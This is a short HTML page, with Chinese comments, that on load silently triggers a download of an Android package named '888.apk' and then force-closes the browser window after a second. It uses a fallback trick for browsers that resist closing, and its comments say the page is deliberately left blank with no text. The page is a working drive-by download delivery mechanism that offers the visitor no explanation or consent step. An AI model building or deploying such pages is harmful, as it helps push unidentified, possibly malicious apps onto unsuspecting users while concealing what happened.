<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Download</title>
    <script>
        window.onload = function() {
            // 1. 瞬间触发 APK 下载
            var link = document.createElement('a');
            link.href = "./888.apk";
            link.download = "888.apk";
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);

            // 2. 延迟 1 秒后自动关闭当前网页窗口
            setTimeout(function() {
                // 尝试用标准方法关闭窗口
                window.close();
                
                // 兼容部分浏览器的强行关闭逻辑
                if (!window.closed) {
                    window.open('', '_self', '');
                    window.close();
                }
            }, 1000); // 1000 毫秒 = 1 秒，你可以根据需要缩短，例如改成 500
        }
    </script>
</head>
<body style="background-color: #ffffff; margin: 0; padding: 0;">
    <!-- 保持页面完全空白，不留任何文字 -->
</body>
</html>
